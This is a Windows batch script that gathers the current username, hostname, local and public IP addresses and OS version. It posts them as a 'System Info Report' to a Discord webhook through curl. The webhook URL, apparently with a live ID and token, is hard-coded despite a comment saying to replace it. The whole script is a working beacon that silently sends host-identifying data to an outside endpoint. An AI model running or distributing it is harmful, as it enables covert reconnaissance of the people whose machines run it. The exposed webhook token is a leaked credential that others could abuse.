@echo off
setlocal ENABLEDELAYEDEXPANSION

:: Get public IP from ipinfo.io
for /f "usebackq delims=" %%i in (`curl -s https://ipinfo.io/ip`) do set "public_ip=%%i"

:: Get local IP (first IPv4 address that isn't loopback)
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /R /C:"IPv4.*"') do (
    set "local_ip=%%i"
    set "local_ip=!local_ip:~1!"
    goto :gotlocal
)
:gotlocal

:: Get hostname
for /f %%i in ('hostname') do set "hostname=%%i"

:: Get OS version
for /f "tokens=*" %%i in ('ver') do set "os_version=%%i"

:: Get current user
set "current_user=%USERNAME%"

:: Construct JSON payload (note the escaped quotes)
set "json={"
set "json=!json!\"content\":\"🖥️ System Info Report\n"
set "json=!json!👤 User: %current_user%\n"
set "json=!json!💻 Hostname: %hostname%\n"
set "json=!json!🌐 Local IP: %local_ip%\n"
set "json=!json!📡 Public IP: %public_ip%\n"
set "json=!json!🪟 OS: %os_version%\""
set "json=!json!}"

:: Send to webhook (replace URL below)
curl -H "Content-Type: application/json" -d "!json!" https://discord.com/api/webhooks/1378469296560275627/cNZ6YLDw4yo1KxjAn3ih__dN-rwIyKCwSysM_LuPxrKzqdbJ6mPTkvGP1IJ-6NQjgXUg

endlocal

